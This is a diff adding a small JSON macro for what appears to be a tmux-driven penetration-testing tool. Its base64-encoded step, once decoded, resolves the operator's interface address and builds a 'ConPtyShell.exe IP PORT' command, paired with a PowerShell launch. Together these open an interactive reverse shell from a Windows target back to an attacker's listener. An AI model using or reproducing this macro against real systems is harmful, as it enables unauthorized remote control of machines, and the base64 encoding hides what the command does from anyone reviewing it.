@@ -1,0 +1,7 @@
+[
+    {"require":"IP"},
+    {"require":"PORT"},
+    {"send-from-cmd-b64":"SVA9JChpZiBpcCAtanNvbiBhZGRyIHNob3cgJElQICY+IC9kZXYvbnVsbCA7IHRoZW4gZWNobyAkKGlwIC1qc29uIGFkZHIgc2hvdyAkSVAgfCYganEgLXIgJy5bXS5hZGRyX2luZm9bXSB8IHNlbGVjdCguZmFtaWx5ID09ICJpbmV0IikubG9jYWwnICkgOyBlbHNlIGVjaG8gIiRJUCI7IGZpKTsgZWNobyAiQ29uUHR5U2hlbGwuZXhlICRJUCAkUE9SVCAi"},
+    {"send-from-cmd":"tmux display-message -pt \"$PANE\" -F '#{pane_height} #{pane_width}'"},
+    {"send-string":" powershell.exe"}
+]
